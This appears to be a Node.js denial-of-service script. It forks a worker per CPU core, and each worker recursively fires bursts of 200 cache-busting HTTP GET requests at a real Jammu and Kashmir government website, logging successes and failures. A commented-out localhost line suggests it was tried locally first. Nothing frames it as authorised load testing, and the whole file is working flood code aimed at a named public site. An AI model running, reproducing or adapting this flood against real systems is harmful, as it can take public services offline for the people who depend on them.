const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
var axios = require('axios');


if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork workers.
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`worker ${worker.process.pid} died`);
  });
} else {
 let count = 0;

async function fire(){

   try{
	const res = await axios.get('https://www.jk.gov.in/jammukashmir/?id='+Math.random());
	//await axios.get('http://localhost:3000/healthcheck/all/?q='+count);
	console.log('success :',count, res.status)

    } catch(e){
            console.log('failed',e.code)
    } finally {
        if(count<1201){
          count +=1;
          const limit = 200
	  for(i=0;i<limit;i++){
 	  fire();
	  }
 	}


    }

  }

   fire();
  console.log(`Worker ${process.pid} started`);
}




